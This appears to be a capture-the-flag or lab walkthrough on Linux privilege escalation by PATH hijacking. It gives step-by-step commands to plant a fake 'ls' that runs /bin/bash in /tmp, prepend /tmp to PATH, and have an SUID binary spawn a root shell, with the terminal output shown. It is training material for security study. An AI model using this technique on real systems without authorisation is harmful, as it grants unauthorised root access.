Exploiting PATH variable

What is PATH?

PATH is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. When the user runs any command in the terminal, it searches for executable files with the help of the PATH Variable in response to commands executed by a user.

It is very simple to view the Path of the relevant user with help of the command "echo $PATH".

How does this let us escalate privileges?

Let's say we have an SUID binary. Running it, we can see that itâ€™s calling the system shell to do a basic process like list processes with "ps". Unlike in our previous SUID example, in this situation we can't exploit it by supplying an argument for command injection, so what can we do to try and exploit this?

We can re-write the PATH variable to a location of our choosing! So when the SUID binary calls the system shell to run an executable, it runs one that we've written instead!

As with any SUID file, it will run this command with the same privileges as the owner of the SUID file! If this is root, using this method we can run whatever commands we like as root

Let's go to user5's home directory, and run the file "script". What command do we think that it's executing?
```
user5@polobox:/$ cd /home/user5
user5@polobox:~$ ls
Desktop    Downloads  Pictures  script     Videos
Documents  Music      Public    Templates

user5@polobox:~$ ./script
Desktop    Downloads  Pictures	script	   Videos
Documents  Music      Public	Templates
```
ls

Now we know what command to imitate, let's change directory to "tmp". 
Now we're inside tmp, let's create an imitation executable. The format for what we want to do is:

echo "[whatever command we want to run]" > [name of the executable we're imitating]

What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating
```
echo "/bin/bash" > ls
```

Now we've made our imitation, we need to make it an executable. What command do we execute to do this?
```
chmod +x ls
```
Now, we need to change the PATH variable, so that it points to the directory where we have our imitation "ls" stored! We do this using the command "export PATH=/tmp:$PATH"

Note, this will cause you to open a bash prompt every time you use "ls". If you need to use "ls" before you finish the exploit, use "/bin/ls" where the real "ls" executable is. 

```
user5@polobox:/tmp$ echo "/bin/bash" > ls
user5@polobox:/tmp$ chmod +x ls
user5@polobox:/tmp$ export PATH=/tmp:$PATH
user5@polobox:/tmp$ ls
Welcome to Linux Lite 4.4 user5
 
Sunday 15 December 2024, 20:13:54
Memory Usage: 364/1991MB (18.28%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
user5@polobox:/tmp$
```
Once you've finished the exploit, you can exit out of root and use "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH" to reset the PATH variable back to default, letting you use "ls" again

Now, change directory back to user5's home directory.

Run the "script" file again, you should be sent into a root bash prompt
```
user5@polobox:/tmp$ cd ~
user5@polobox:~$ ./script
Welcome to Linux Lite 4.4 user5
 
Sunday 15 December 2024, 20:19:05
Memory Usage: 363/1991MB (18.23%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
root@polobox:~#
```

